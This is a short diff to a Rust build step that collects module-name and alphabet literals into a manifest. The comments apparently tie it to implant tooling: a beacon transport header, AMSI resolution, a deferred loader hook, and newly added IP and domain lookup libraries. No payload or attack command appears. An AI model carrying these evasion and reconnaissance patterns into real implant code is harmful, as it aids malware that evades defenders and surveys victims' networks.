@@ -49,10 +49,12 @@ fn main() {
                                         // base64 alphabet of the beat header (core::transport)
     manifest.push("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".to_string());
     // runtime module-name literals (amsi resolution, deferred loader hook,
-    // WinHTTP on-demand load)
+    // WinHTTP/IP/domain on-demand loads)
     manifest.push("amsi.dll".to_string());
     manifest.push("ntdll.dll".to_string());
     manifest.push("winhttp.dll".to_string());
+    manifest.push("iphlpapi.dll".to_string());
+    manifest.push("netapi32.dll".to_string());
     manifest.sort();
     manifest.dedup();
     let manifest = serde_json::to_string(&manifest).expect("manifest serialize");
